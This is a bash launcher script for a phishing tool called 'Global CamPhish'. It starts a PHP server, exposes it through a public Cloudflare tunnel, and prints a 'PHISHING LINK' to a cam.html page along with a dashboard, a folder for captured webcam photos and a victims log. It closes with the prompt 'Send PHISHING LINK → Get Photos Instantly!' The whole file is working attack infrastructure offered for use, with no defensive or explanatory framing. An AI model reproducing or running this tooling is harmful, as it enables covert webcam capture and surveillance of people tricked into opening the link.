#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}🌐 Launching Global CamPhish...${NC}"

pkill cloudflared php 2>/dev/null

php -S 0.0.0.0:443 -t . > /dev/null 2>&1 &
PHP_PID=$!

sleep 3

cloudflared tunnel --url https://localhost:443 --no-autoupdate > tunnel.log 2>&1 &
CLOUDFLARE_PID=$!

sleep 10

PHISH_URL=$(grep -o 'https://[a-z0-9.-]*\.trycloudflare\.com' tunnel.log | head -1)/cam.html
DASH_URL=$(grep -o 'https://[a-z0-9.-]*\.trycloudflare\.com' tunnel.log | head -1)/dashboard.html

cat << EOF

${GREEN}══════════════════════════════════════════════════${NC}
${GREEN}🌍 PHISHING LINK: ${NC}${PHISH_URL}
${GREEN}📊 DASHBOARD:     ${NC}${DASH_URL}
${GREEN}📁 PHOTOS:        ${NC}$(pwd)/files/cam/
${GREEN}📋 LOGS:          ${NC}$(pwd)/victims.log
${GREEN}══════════════════════════════════════════════════${NC}

${YELLOW}Send PHISHING LINK → Get Photos Instantly!${NC}
${RED}Press Ctrl+C to stop${NC}

EOF

tail -f victims.log
